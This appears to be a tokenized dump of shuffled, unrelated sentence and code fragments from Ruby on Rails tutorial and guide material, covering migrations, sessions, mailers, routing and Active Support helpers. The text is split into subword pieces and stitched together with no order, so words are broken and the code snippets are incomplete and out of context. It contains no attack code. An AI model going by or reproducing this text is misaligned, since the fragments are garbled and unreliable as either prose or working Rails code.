▁These ▁location s ▁are ▁explained ▁in ▁detail ▁in ▁the ▁[ Asset ▁Or g an i z ation ▁section ▁in ▁the ▁ Asset ▁Pipeline ▁G u ide ]( asset _ pipeline ▖ html # asset - org an i z ation )
▁as ▁show n ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test } .
▁In ▁what ▁follows , ▁each ▁item ▁includes ▁a ▁reference ▁to ▁a ▁section ▁or ▁code ▁ listing ▁with ▁an ▁example ▁of ▁the ▁change ▁in ▁question .
▁as ▁show n ▁in ▁Listing ~\ ref { code : comment _ out _ failing _ tests } .
▁### ▁Initialize rs
▁╼╼ ▁\ subsection { Users ▁controller } ▁% ▁( fold )╼ ▁\ label { sec : users _ controller }╼╼
▁A ▁ summary ▁of ▁user / active ▁relationship ▁association ▁methods .
▁ SELECT ▁clients .
▁### ▁ Error ▁handling ▁in ▁ transaction ▁callbacks
▁# ▁and ▁go es ▁back ▁to ▁the ▁database
▁If ▁you ▁like , ▁you ▁may ▁add ▁ additional ▁routes ▁that ▁apply ▁to ▁the ▁collection ▁or ▁individual ▁ member s ▁of ▁the ▁collection .
▁ Regexp ▖ new (' ▖ ', ▁ Regexp :: M U L T I L IN E )▖ multiline ?
▁It ' s ▁worth ▁noting ▁that ▁the ▁model ▁in ▁Figure ~\ ref { fig : micropost _ model } ▁uses ▁the ▁\ k ode { text } ▁data ▁type ▁for ▁micropost ▁content ▁( instead ▁of ▁\ k ode { string }), ▁which ▁is ▁cap able ▁of ▁storing ▁an ▁arbitrar y ▁amount ▁of ▁text .
▁# ▁Now ▁in ▁Rails ▁4▖1
▁In ▁the ▁process , ▁we ' ll ▁also ▁have ▁a ▁chance ▁to ▁learn ▁how ▁to ▁send ▁email ▁in ▁Rails , ▁both ▁in ▁development ▁and ▁in ▁production .
▁select _ date ( Time ▖ today ▁+ ▁6 ▖ day s )
▁L at er ▁in ▁this ▁guide ▁you ' ll ▁find ▁out ▁how ▁to ▁get ▁ ed ge ▁Rails ▁for ▁testing .
▁In ▁particular , ▁we ' ll ▁add ▁an ▁important ▁feature ▁to ▁the ▁production ▁application ▁to ▁make ▁signup ▁secure , ▁and ▁we ' ll ▁replace ▁the ▁default ▁web ▁server ▁with ▁one ▁suit able ▁for ▁real - world ▁use .
▁In ▁the ▁present ▁case , ▁these ▁variables ▁are ▁configured ▁automatically ▁via ▁the ▁ SendGrid ▁add - on , ▁but ▁we ' ll ▁see ▁an ▁example ▁in ▁Section ~\ ref { sec : image _ upload _ in _ production } ▁where ▁we ' ll ▁have ▁to ▁define ▁them ▁our s el ve s .
▁( N o w ▁that ▁we ▁have ▁\ k ode { is \_ logged \_ in ?}\ ▁available ▁in ▁tests , ▁we ' ve ▁also ▁throw n ▁in ▁a ▁b on us ▁\ k ode { assert ▁is \_ logged \_ in ?}\ ▁immediately ▁after ▁post ing ▁valid ▁information ▁to ▁the ▁sessions ▁path ▖)
▁T y p ical ly , ▁the ▁messages ▁that ▁get ▁passed ▁to ▁objects ▁are ▁\ emph { methods }, ▁which ▁are ▁function s ▁defined ▁on ▁those ▁objects
▁The ▁br and ▁new ▁User ▁model .
▁Implement ing ▁this ▁is ▁the ▁last ▁bit ▁of ▁polish ▁before ▁let ting ▁users ▁sign ▁out .
▁To ▁see ▁your ▁new ly ▁deploy ed ▁application , ▁visit ▁the ▁address ▁that ▁you ▁saw ▁when ▁you ▁ r an ▁\ k ode { heroku ▁create } ▁( i ▖ e ▖ , ▁Listing ~\ ref { code : heroku _ create }) .
▁A ▁mockup ▁of ▁a ▁profile ▁page ▁with ▁microposts ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ microposts _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁Note ▁that ▁the ▁password ▁and ▁confirmation ▁in ▁Listing ~\ ref { code : successful _ edit _ test } ▁are ▁blank , ▁which ▁is ▁convenient ▁for ▁users ▁who ▁don ' t ▁want ▁to ▁update ▁their ▁passwords ▁every ▁time ▁they ▁update ▁their ▁names ▁or ▁email ▁addresses .
▁ }╼╼ ╼ ▁% ▁subsection ▁database _ migrations ▁( end )╼╼ ▁\ subsection { The ▁model ▁file } ▁% ▁( fold )╼ ▁\ label { sec : the _ model _ file }╼╼
▁as ▁show n ▁in ▁Listing ~\ ref { code : follow _ unfollow _ following } .
▁ Security ╼ in ▁your ▁Rails ▁application ▁is ▁covered ▁in ▁more ▁ de p th ▁in ╼ the ▁[ Ruby ▁on ▁Rails ▁ Security ▁G u ide ]( security ▖ html )
▁[1, ▁2, ▁3] ▖ in _ groups _ of ( 2, ▁0 ) ▁# ▁=> ▁[[1, ▁2 ] , ▁[ 3 , ▁0 ]]
▁Client ▖ order ( created _ at : ▁: desc )
▁T y p ical ly , ▁this ▁means ▁assign ing ▁to ▁variables ▁that ▁are ▁initially ▁\ k ode { nil }, ▁but ▁note ▁that ▁\ k ode { false } ▁values ▁will ▁also ▁be ▁over written ▁by ▁the ▁\ k ode { ||= } ▁operator .
▁resources ▁: images , ▁only : ▁: index
▁You ▁don ' t ▁have ▁to ▁know ▁what ▁each ▁class ▁in ▁this ▁hierarchy ▁does .
▁A bo ve ▁and ╼ beyond ▁ mass ▁assignment ▁issues , ▁the ▁method ▁is ▁often ▁made ▁` private ` ▁to ▁make ▁sure ╼ it ▁can ' t ▁be ▁called ▁out side ▁its ▁intend ed ▁context .
▁You ▁should ▁also ▁ q u it ▁and ▁restart ▁the ▁Rails ▁development ▁server .
▁if ▁@ book ▖ nil ?
▁If ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁you ▁should ▁run ▁the ▁following ▁command ▁to ▁ checkout ▁a ▁topic ▁branch ▁for ▁static ▁pages :
▁By ▁default , ▁records ▁are ▁fetch ed ▁in ▁as c end ing ▁order ▁of ▁the ▁primary ▁key , ▁which ▁must ▁be ▁an ▁ integer ▖
▁( If ▁it ▁doesn ' t ▁work , ▁be ▁sure ▁that ▁JavaScript ▁is ▁enabled ▁in ▁your ▁browser ; ▁Rails ▁uses ▁JavaScript ▁to ▁issue ▁the ▁request ▁needed ▁to ▁destroy ▁a ▁user ▖)
▁For ▁example , ▁if ▁your ▁application ▁includes ▁ customers ▁and ▁orders , ▁and ▁each ▁order ▁can ▁be ▁as signed ▁to ▁exactly ▁one ▁customer , ▁you ' d ▁declare ▁the ▁order ▁model ▁this ▁way :
▁We ' ll ▁learn ▁in ▁Section ~\ ref { sec : slightly _ dynamic _ pages } ▁what ▁the ▁\ k ode { ▖ erb } ▁part ▁means ; ▁from ▁the ▁\ k ode { ▖ html } ▁part ▁you ▁ probably ▁won ' t ▁be ▁surpris ed ▁that ▁it ▁basic ally ▁look s ▁like ▁HTML ▁( Listing ~\ ref { code : raw _ home _ view }) .
▁With ▁the ▁code ▁in ▁this ▁section , ▁the ▁user ▁edit ▁page ▁should ▁be ▁working ▁( Figure ~\ ref { fig : edit _ form _ working }), ▁as ▁you ▁can ▁double - check ▁by ▁re - running ▁the ▁test ▁suite , ▁which ▁should ▁now ▁be ▁\ passing :
▁You ▁can ▁change ▁this ▁p adding ▁value ▁using ▁the ▁second ▁optional ▁argument :
▁Let ' s ▁start ▁explor ing ▁strings ▁with ▁the ▁console :
▁ Test - driven ▁development ▁is ▁useful ▁when ▁debugging ▁by ▁re p r o d u c ing ▁the ▁bug ▁in ▁a ▁test .
▁Code ▁to ▁display ▁error ▁messages ▁on ▁the ▁signup ▁form .
▁First , ▁we ' ll ▁add ▁the ▁\ emph { Faker } ▁gem ▁to ▁the ▁\ k ode { Gemfile }, ▁which ▁will ▁allow ▁us ▁to ▁make ▁sample ▁users ▁with ▁ s em i - real ist ic ▁names ▁and ▁email ▁addresses ▁( Listing ~\ ref { code : fa k er _ gemfile }) .
▁render ▁" edit "
▁Tests ▁for ▁valid ▁email ▁format s ▖
▁Because ▁it ' s ▁construct ed ▁using ▁ bcrypt , ▁it ▁is ▁ com put ation ally ▁ im p ra c t ical ▁to ▁use ▁the ▁digest ▁to ▁ discover ▁the ▁original ▁password
▁A ▁test ▁for ▁a ▁valid ▁signup ▖
▁This ▁list ▁is ▁present ed ▁for ▁the ▁convenience ▁of ▁those ▁who ▁read ▁the ▁2 nd ▁ edition ▁( or ▁are ▁otherwise ▁ familiar ▁with ▁Rails ~ 3▖2 ) ▁and ▁want ▁a ▁ summary ▁of ▁the ▁d if f s .
▁There ▁are ▁four ▁new ▁links , ▁two ▁of ▁which ▁are ▁ stub b ed ▁out ▁( to ▁be ▁complete d ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }) :
▁### ▁ W h y ▁Use ▁ Validations ?
▁The ▁index ▁view ▁( ` app / views / users / index ▖ html ▖ erb ` ) ▁contains :
▁A ▁test ▁for ▁an ▁initially ▁valid ▁user ▖
▁Date ▖ new (201 0, ▁4 , ▁30 )▖ months _ ago (2) ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010
▁Active ▁Support ▁add s ▁constant ▁ autoload ing ▁support ▁to ▁` load ` .
▁=> ▁" Example ▁User "
▁It ▁will ▁be ▁recognize d ▁by ▁the ▁above ▁ sanitize () ▁filter , ▁though ▖
▁def ▁perform ( trashable , ▁ de p th )
▁<%= ▁render ▁" menu " ▁%>
▁This ▁is ▁the ▁final ▁step ▁required ▁to ▁get ▁the ▁new ▁comment ▁form ▁working ▖
▁" Invoice L in e "▖ tableize ▁# ▁=> ▁" invoice _ lines "
▁ Most ▁browsers ▁display ▁the ▁contents ▁of ▁the ▁title ▁tag ▁at ▁the ▁to p ▁of ▁the ▁browser ▁window ▁( Google ▁C h r o me ▁is ▁an ▁ o d d ▁exception ), ▁and ▁it ▁is ▁also ▁important ▁for ▁search - engine ▁opt im i z ation .
▁The ▁form ▁needs ▁to ▁use ▁a ▁different ▁URL ▁in ▁order ▁to ▁go ▁some where ▁else ▖╼
▁* ▁First , ▁to ▁tell ▁ Mail ▁to ▁turn ▁an ▁ attachment ▁into ▁an ▁ inline ▁ attachment , ▁you ▁just ▁call ▁` # inline ` ▁on ▁the ▁ attachments ▁method ▁within ▁your ▁Mailer :
▁It ' s ▁that ▁hand of f ▁that ▁is ▁the ▁subject ▁of ▁this ▁guide .
▁In ▁fact , ▁because ▁this ▁sort ▁of ▁construction ▁is ▁so ▁useful , ▁Active ▁Record ▁provides ▁it ▁by ▁default :
▁ Adding ▁the ▁\ k ode { about } ▁route ▖
▁So , ▁for ▁example , ▁page ~ 1 ▁is ▁users ▁1 - - 30 , ▁page ~ 2 ▁is ▁users ▁31 - - 60 , ▁etc ▖ ▁If ▁\ k ode { page } ▁is ▁\ k ode { nil }, ▁\ k ode { paginate } ▁simply ▁returns ▁the ▁first ▁page .
▁This ▁book ▁by ▁ Michael ▁Hartl ▁c a me ▁so ▁high ly ▁recommended ▁that ▁I ▁ha d ▁to ▁try ▁it , ▁and ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁is ▁what ▁I ▁used ▁to ▁switch ▁back ▁to ▁Rails ▁again .
▁It ▁is ▁reason able ▁to ▁as k ▁why ▁the ▁user ▁needs ▁to ▁leave ▁that ▁page ▁at ▁all .
▁The ▁migration ▁to ▁add ▁the ▁data ▁model ▁from ▁Figure ~\ ref { fig : user _ model _ account _ activation } ▁add s ▁all ▁three ▁attributes ▁at ▁the ▁command ▁line :
▁This ▁discussion ▁will ▁only ▁make ▁much ▁sense ▁if ▁you ▁have ▁some ▁experience ▁with ▁object - or i ent ed ▁programming ▁( O O P ) ; ▁if ▁you ▁have n ' t ▁ st udi ed ▁O O P , ▁feel ▁free ▁to ▁skip ▁this ▁section .
▁| ▁DELETE ▁| ▁ / sekret / comments / : id (▖ : format ) ▁| ▁comments # destroy ▁| ▁comment _ path ▁|
▁The ▁basic ▁idea ▁of ▁the ▁command ▁line ▁is ▁simple : ▁by ▁is s u ing ▁short ▁commands , ▁users ▁can ▁perform ▁a ▁large ▁number ▁of ▁operations , ▁such ▁as ▁creating ▁directories ▁(\ text tt { mkdir }), ▁mov ing ▁and ▁copy ing ▁files ▁(\ text tt { mv } ▁and ▁\ text tt { c p }), ▁and ▁ nav ig ating ▁the ▁file system ▁by ▁changing ▁directories ▁(\ text tt { cd }) .
▁database : ▁ NOT _ my _ database
▁Here ▁are ▁some ▁I ▁particular ly ▁recommend :
▁belongs _ to ▁: author , ▁class _ name : ▁" User "
▁Note ▁that ▁we ' ve ▁used ▁the ▁\ emph { order ed ▁list } ▁tag ~\ k ode { ol } ▁( as ▁oppos ed ▁to ▁an ▁un order ed ▁list ~\ k ode { ul }) ▁because ▁microposts ▁are ▁list ed ▁in ▁a ▁particular ▁order ▁( reverse - ch r on o logical ) .
▁However ▁if ▁you ▁must ▁do ▁this , ▁you ▁may ▁use ▁` where ` ▁as ▁you ▁would ▁normal ly .
▁render ▁ json : ▁@ product
▁Because ▁these ▁ decorator s ▁are ▁not ▁reference d ▁by ▁your ▁Rails ▁application ▁itself ,╼ Rails ' ▁ autoload ing ▁system ▁will ▁not ▁ k ic k ▁in ▁and ▁load ▁your ▁ decorator s ▖
▁Layouts ▁and ▁Rendering ▁in ▁Rails
▁### ▁S k ip p ing ▁ Validations
▁belongs _ to ▁: order , ▁-> ▁ { ▁includes ▁: customer ▁ }
▁As ▁show n ▁in ▁Listing ~\ ref { code : sendgrid _ config _ redux }, ▁you ▁will ▁also ▁have ▁to ▁define ▁a ▁\ k ode { host } ▁variable ▁with ▁the ▁address ▁of ▁your ▁production ▁website .
▁* ▁Set s ▁cookies ▁for ▁the ▁request .
▁╼╼ ▁% ▁sub subsection ▁refactor ▁( end )╼╼ ▁% ▁subsection ▁our _ first _ test ╼╼ ▁% ▁section ▁getting _ started _ with _ testing ▁( end )╼╼ ╼ ▁\ section { S l ight ly ▁dynamic ▁pages } ▁% ▁( fold )╼ ▁\ label { sec : slightly _ dynamic _ pages }╼╼
▁In ▁the ▁case ▁of ▁the ▁` blorgh ` ▁engine , ▁making ▁articles ▁and ▁comments ╼ have ▁author s ▁would ▁make ▁a ▁lot ▁of ▁sense .
▁As ▁noted ▁in ▁Section ~\ ref { sec : reset ting _ the _ password }, ▁if ▁we ▁read ▁\ k ode { < } ▁as ▁`` e ar li er ▁than '' ▁instead ▁of ▁`` less ▁than '' , ▁this ▁code ▁make s ▁sense ▁as ▁the ▁English ▁ sentence ▁`` The ▁password ▁reset ▁was ▁sent ▁earlier ▁than ▁two ▁hours ▁ ago ▖ ''
▁assemblies ▖ size
▁Because ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁are ▁both ▁instance ▁variables ▁( as ▁indicate d ▁with ▁the ~\ k ode {@ } ▁sign ), ▁they ▁are ▁automatically ▁available ▁in ▁the ▁\ k ode { formatted \_ email } ▁method .
▁For ▁each ▁user , ▁implement ▁an ▁ RSS ▁feed ▁for ▁their ▁microposts .
▁### ▁Action ▁Mailer
▁Action ▁View ▁has ▁the ▁ability ▁render ▁different ▁templates ▁depending ▁on ▁the ▁current ▁ locale .
▁The ▁test ▁in ▁Listing ~\ ref { code : unsuccessful _ edit _ test } ▁check s ▁for ▁the ▁correct ▁behavior ▁by ▁verify ing ▁that ▁the ▁edit ▁template ▁is ▁rendered ▁after ▁getting ▁the ▁edit ▁page ▁and ▁re - render ed ▁upon ▁submission ▁of ▁invalid ▁information .
▁A ▁\ k ode { create } ▁action ▁for ▁password ▁resets .
▁With ▁the ▁code ▁as ▁in ▁Listing ~\ ref { code : password _ reset _ integration _ test }, ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁The ▁cloud ▁IDE ▁run s ▁inside ▁an ▁ordinar y ▁web ▁browser ▁and ▁hence ▁works ▁the ▁same ▁a cross ▁different ▁platform s , ▁which ▁is ▁es pecially ▁useful ▁for ▁operat ing ▁systems ▁( such ▁as ▁Windows ) ▁on ▁which ▁Rails ▁development ▁has ▁his to r ical ly ▁been ▁difficult .
▁ hello ") ▁# ▁=> ▁true
▁Fin ally ,╼ we ▁redirect ▁the ▁user ▁to ▁the ▁` show ` ▁action , ▁which ▁we ' ll ▁define ▁later .
▁ grade _ deployment ▁( end )╼╼ ▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : sign _ up _ co nclusion }╼╼ B e ing ▁able ▁to ▁sign ▁up ▁users ▁is ▁a ▁major ▁mil est one ▁for ▁our ▁application .
▁create ▁db / migrate / 2013 0 3 07 00 55 28 _ create _ microposts ▖ rb
▁Rails ▁uses ▁HTTP ▁status ▁code ▁ 302 , ▁a ▁temporary ▁redirect , ▁when ▁you ▁call ▁` redirect _ to ` ▖
▁The ▁ predicate ▁` in ?` ▁tests ▁if ▁an ▁object ▁is ▁included ▁in ▁another ▁object ▖
▁It ▁is ▁set ▁by ▁default ▁by ▁` sass - rails ` ▖
▁The ▁\ text tt { ||= } ▁construction ▁is ▁very ▁Ruby is h --- that ▁is , ▁it ▁is ▁high ly ▁character ist ic ▁of ▁the ▁Ruby ▁language --- and ▁hence ▁important ▁to ▁learn ▁if ▁you ▁plan ▁on ▁doing ▁much ▁Ruby ▁programming .
▁TIP : ▁A ▁symbol ▁can ▁represent ▁a ▁fully - qualified ▁constant ▁name ▁as ▁in ▁`: " ActiveRecord :: Base " `, ▁so ▁the ▁behavior ▁for ▁symbols ▁is ▁defined ▁for ▁convenience , ▁not ▁because ▁it ▁has ▁to ▁be ▁that ▁way ▁technical ly .
▁C ▖ descendants ▁# ▁=> ▁[ B , ▁A , ▁D ]
▁``` y a m l
▁since , ▁in ▁the ▁case ▁of ▁a ▁\ k ode { : followers } ▁attribute , ▁Rails ▁will ▁ singularize ▁`` followers '' ▁and ▁automatically ▁look ▁for ▁the ▁foreign ▁key ▁\ k ode { follower \_ id } ▁in ▁this ▁case .
▁The ▁test ▁appears ▁in ▁Listing ~\ ref { code : micropost _ interface _ test } .
▁` find _ by _ sql ` ▁has ▁a ▁close ▁relative ▁called ▁` connect ion # select _ all ` ▖ ▁` select _ all ` ▁will ▁retrieve ▁objects ▁from ▁the ▁database ▁using ▁custom ▁SQL ▁just ▁like ▁` find _ by _ sql ` ▁but ▁will ▁not ▁in st an t i ate ▁them ▖
▁C :: X ", ▁false ) ▁# ▁=> ▁false
▁Tests ▁for ▁the ▁Relationship s ▁controller ▁ authorization .
▁| ▁app / assets / javascripts / comment ▖ js ▖ coffee ▁| ▁CoffeeScript ▁for ▁the ▁controller ▁|
▁are ▁all ▁the ▁same ▖ ▁\ emph { Hint } : ▁It ' s ▁ probably ▁easie st ▁to ▁compare ▁directly ▁using ▁\ k ode {==} ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - e 4 e f 4 b ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁a _ proto _ feed ▁( end )╼╼ ▁\ subsection { Destroy ing ▁microposts } ▁% ▁( fold )╼ ▁\ label { sec : destroy ing _ microposts }╼╼
▁The ▁Rails ▁Way ▁is ▁to ▁use ▁migrations ▁every ▁time ▁we ▁ discover ▁that ▁our ▁data ▁model ▁needs ▁to ▁change .
▁ Contribut ing ▁to ▁Ruby ▁on ▁Rails
▁content : ▁ en code d _ content
▁Tests ▁protect ▁again st ▁\ emph { re gr ess ion s }, ▁where ▁a ▁function ing ▁feature ▁stop s ▁working ▁for ▁some ▁reason .
▁In ▁Section ~\ ref { sec : signing _ in }, ▁we ▁used ▁the ▁Rails ▁\ k ode { session } ▁method ▁to ▁store ▁the ▁user ' s ▁id , ▁but ▁this ▁information ▁disappear s ▁when ▁the ▁user ▁close s ▁their ▁browser .
▁orders ▖ exists ? (▖▖▖)
▁This ▁helper ▁validates ▁that ▁the ▁attribute ' s ▁value ▁is ▁unique ▁right ▁before ▁the ╼ object ▁get s ▁saved ▖
▁* ▁[ Re v v ing ▁File name s : ▁don ' t ▁use ▁query string ]( http :// www ▖ s te ve so u d ers ▖ com / blog / 2008 / 08 / 23 / re v v ing - filename s - do nt - use - query string / )
▁Then ▁change ▁it ▁to ▁use ▁the ▁ Markdown ▁extension ~\ k ode { ▖ md } ▁and ▁commit ▁the ▁changes :
▁A m bit i ous ▁readers ▁are ▁in v it ed ▁to ▁try ▁their ▁hand ▁at ▁implement ing ▁it .
▁Your ▁bundle ▁is ▁complete !
▁As ▁a ▁result , ▁the ▁tests ▁for ▁the ▁Home ▁page ▁should ▁now ▁pass .
▁Note ▁that ▁Listing ~\ ref { code : rails _ command } ▁explicitly ▁includes ▁the ▁Rails ▁version ▁number ▁(\ k ode { \_ 4▖2▖0 \_ }) ▁as ▁part ▁of ▁the ▁command .
▁The ▁site ▁layout ▁with ▁added ▁structure .
▁* ▁How ▁to ▁send ▁and ▁receive ▁email ▁within ▁a ▁Rails ▁application .
▁ Q uite ▁a ▁bit , ▁actually :
▁With ▁these ▁consider ation s ▁in ▁mind , ▁we ▁can ▁create ▁a ▁valid ▁token ▁and ▁ associated ▁digest ▁by ▁first ▁making ▁a ▁new ▁remember ▁token ▁using ▁\ k ode { User ▖ new \_ token }, ▁and ▁then ▁updating ▁the ▁remember ▁digest ▁with ▁the ▁result ▁of ▁apply ing ▁\ k ode { User ▖ digest } ▖ ▁This ▁ procedure ▁gives ▁the ▁\ k ode { remember } ▁method ▁show n ▁in ▁Listing ~\ ref { code : user _ model _ remember } .
▁( The ▁ alert ▁reader ▁m ight ▁notice ▁at ▁this ▁point ▁that ▁the ▁second ▁\ k ode { return } ▁here ▁is ▁actually ▁unnecessary --- be ing ▁the ▁last ▁expression ▁in ▁the ▁function , ▁the ▁string ▁\ k ode {" The ▁string ▁is ▁nonempty ▖ "} \ ▁will ▁be ▁returned ▁regardless ▁of ▁the ▁\ k ode { return } ▁keyword , ▁but ▁using ▁\ k ode { return } ▁in ▁both ▁place s ▁has ▁a ▁p le as ing ▁ sy m me try ▁to ▁it ▖)
▁For ▁example ,╼ to ▁run ▁Action ▁Mailer ▁tests :
▁When ▁duplicate ▁connection ▁information ▁is ▁provided ▁the ▁environment ▁variable ▁will ▁take ▁precedence :
▁resources ▁: user _ permission s , ▁controller : ▁' admin / user _ permission s '
▁I 18 n ▖ with _ options ▁ locale : ▁user ▖ locale , ▁scope : ▁" new s let ter " ▁do ▁| i 18 n |
▁\ begin { equ ation }╼\ label { eq : time _ de lt a }╼\ D el t a ▁t _ r ▁> ▁\ D el t a ▁t _ e .
▁When ▁we ▁last ▁saw ▁our ▁new ▁application , ▁we ▁ha d ▁just ▁updated ▁our ▁ mostly ▁static ▁pages ▁to ▁use ▁Rails ▁ layouts ▁to ▁eliminate ▁duplication ▁in ▁our ▁views , ▁as ▁show n ▁in ▁Listing ~\ ref { code : application _ layout _ redux } ▁( which ▁is ▁the ▁same ▁as ▁Listing ~\ ref { code : application _ layout }) .
▁# ▁via ▁a ▁named ▁scope
▁which ▁check s ▁for ▁a ▁\ k ode { div } ▁tag .
▁errors [: base ] ▁<< ▁" This ▁person ▁is ▁invalid ▁because ▁ ▖▖▖"
▁#### ▁option _ groups _ from _ collection _ for _ select
▁For ▁example , ▁you ▁could ▁redirect ▁from ▁where ve r ▁you ▁are ▁in ▁your ▁code ▁to ▁the ▁index ▁of ▁photos ▁in ▁your ▁application ▁with ▁this ▁call :
▁cookies ▖ encrypted [: expiration _ date ] ▁# ▁=> ▁" 20 14 - 0 3- 20 "
▁The ▁user ▁\ k ode { index } ▁action .
▁This ▁uses ▁the ▁built - in ▁Rails ▁function ▁\ k ode { stylesheet \_ link \_ tag } ▁( which ▁you ▁can ▁read ▁more ▁about ▁at ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / AssetTagHelper ▖ html # method - i - stylesheet _ link _ tag } { Rails ▁API }) ▁to ▁include ▁\ k ode { application ▖ css } ▁for ▁all ▁\ href { http :// www ▖ w 3 ▖ org / T R / CSS 2 / media ▖ html } { media ▁types } ▁( including ▁computer ▁ screen s ▁and ▁ print ers ) .
▁In ▁a ▁typical ▁Rails ▁application ▁this ▁includes ▁ vendor ed ▁gems .
▁Having ▁generated ▁and ▁explor ed ▁the ▁Users ▁resource , ▁we ▁turn ▁now ▁to ▁the ▁ associated ▁Microposts ▁resource .
▁When ever ▁a ▁bug ▁is ▁found , ▁write ▁a ▁test ▁to ▁re p r o d u ce ▁it ▁and ▁protect ▁again st ▁re gr ess ion s , ▁then ▁write ▁the ▁application ▁code ▁to ▁fix ▁it .
▁ //= ▁require ▁ s li d er
▁We ▁come ▁now ▁to ▁the ▁p in n ac le ▁of ▁our ▁sample ▁application : ▁the ▁status ▁feed ▁of ▁microposts .
▁ Most ▁migrations ▁( including ▁all ▁the ▁one s ▁in ▁this ▁tutorial ) ▁are ▁\ emph { reversible }, ▁which ▁means ▁we ▁can ▁`` migrate ▁down '' ▁and ▁undo ▁them ▁with ▁a ▁single ▁Rake ▁task , ▁called ▁\ k ode { db : rollback } :
▁Change ▁the ▁user name ▁and ▁password ▁in ▁the ▁` development ` ▁section ▁as ▁appropriate .
▁If ▁hours ▁are ▁ zero ed , ▁then ▁minutes ▁and ▁second s ▁are ▁too ▁( unless ▁they ▁have ▁given ▁values ) :
▁in ▁Listing ~\ ref { code : initial _ signup _ test } .
▁* ▁You ▁must ▁not ▁run ▁the ▁C api str a no ▁deployment ▁task ▁that ▁ precompile s ▁assets .
▁For ▁the ▁purposes ▁of ▁this ▁tutorial , ▁I ▁suggest ▁creating ▁a ▁gem set ▁called ▁\ k ode { railstutorial \_ rails \_ 4 \_ 0} :
▁Article ▖ where (' id ▁> ▁10 ')▖ limit ( 20 )▖ order (' id ▁ desc ')▖ only (: order , ▁: where )
▁# ▁Table ▁name : ▁users
▁The ▁HTML ▁generated ▁for ▁this ▁would ▁be :
▁Having ▁written ▁tests ▁for ▁signin ▁failure , ▁we ▁now ▁turn ▁to ▁signin ▁ success .
▁* ▁`: type ` ▁specifie s ▁an ▁explicit ▁ MIME ▁type ▖
▁" B ackoffice :: Session "▖ underscore ▁# ▁=> ▁" b ackoffice / session "
▁If ▁you ▁are ▁using ▁a ▁database ▁in ▁a ▁production ▁environment ▁Rails ▁most ▁likely ▁has ▁an ▁adapter ▁for ▁it .
▁### ▁ Connection ▁P ref er ence
▁You ▁can ▁pass ▁an ▁object ▁in ▁to ▁this ▁local ▁variable ▁via ▁the ▁`: object ` ▁option :
▁require ▁' active _ support '
▁render ▁layout : ▁" ol d "
▁ Initial ly , ▁I ▁called ▁the ▁new ▁attribute ▁\ k ode { image }, ▁but ▁that ▁name ▁was ▁so ▁generic ▁it ▁end ed ▁up ▁being ▁confusing .
▁We ▁can ▁send ▁email ▁in ▁production ▁using ▁ SendGrid .
▁before _ enqueue ▁do ▁| job |
▁Instead , ▁we ▁will ▁ exploit ▁the ▁under ly ing ▁ sy m me try ▁between ▁followers ▁and ▁followed ▁users ▁to ▁simul ate ▁a ▁\ k ode { reverse \_ relationships } ▁table ▁by ▁passing ▁\ k ode { followed \_ id } ▁as ▁the ▁primary ▁key .
▁### ▁Using ▁a ▁ Proc ▁with ▁`: if ` ▁and ▁`: unless `
▁Then ▁you ▁can ▁use ▁their ▁remote ▁branch ▁to ▁update ▁your ▁code base ▖
▁To ▁get ▁the ▁application ▁working ▁upon ▁submission ▁of ▁a ▁valid ▁email ▁address ▁as ▁well , ▁we ▁need ▁to ▁define ▁a ▁password ▁reset ▁mailer ▁method .
▁X :: Y :: Z ▖ parent s ▁# ▁=> ▁[ X :: Y , ▁X , ▁Object ]
▁We ' ll ▁also ▁add ▁a ▁way ▁to ▁\ emph { authenticate } ▁a ▁user ▁base d ▁on ▁a ▁given ▁password , ▁a ▁method ▁we ' ll ▁use ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁to ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁site .
▁# ▁has _ secure _ password
▁Ou r ▁final ▁task ▁is ▁to ▁display ▁the ▁number ▁of ▁microposts ▁for ▁each ▁user , ▁which ▁we ▁can ▁do ▁with ▁the ▁\ k ode { count } ▁method :
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ relationships _ method _ test } .
▁Next , ▁we ▁ migrate ▁as ▁usual :
▁A ▁model ▁of ▁followed ▁users ▁through ▁user ▁relationships .
▁In side ▁the ▁file ▁for ▁the ▁custom ▁CSS , ▁we ▁can ▁use ▁the ▁\ k ode {@ import } ▁function ▁to ▁include ▁Bootstrap ▁( to get her ▁with ▁the ▁ associated ▁Sprockets ▁ utility ), ▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ css }
▁#### ▁Rendering ▁ V a nil la ▁JavaScript
▁Sometimes ▁it ▁is ▁f ru str ating , ▁and ▁it ' s ▁easy ▁to ▁get ▁ im patient ▁when ▁you ▁have ▁an ▁a wesome ▁web ▁app ▁in ▁your ▁ head ▁and ▁you ▁\ emph { just ▁want ▁to ▁learn ▁Rails ▁already }, ▁but ▁have ▁to ▁ s p end ▁a ▁ week ▁learning ▁some ▁we ir d ▁an ci ent ▁Unix ▁editor ▁just ▁to ▁get ▁started .
▁In ▁case ▁you ▁are ▁not ▁ familiar ▁with ▁Rack ' s ▁basic s , ▁you ▁should ▁check ▁out ▁the ▁[ Re source s ](# resources ) ▁section ▁below .
▁#### ▁F ar - future ▁Expires ▁Header
▁boolean ? ▁?
▁ tomorrow
▁# ▁ attr i b s : ▁id , ▁name
▁date ▖ beginning _ of _ day ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁00:00:00 ▁+0200 ▁2010
▁The ▁new ▁user ▁page ▁(\ href { http :// localhost :3000/ users / new }{/ users / new }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / demo _ new _ user _ rails _ 3- full ▖ png }{( full ▁size )}
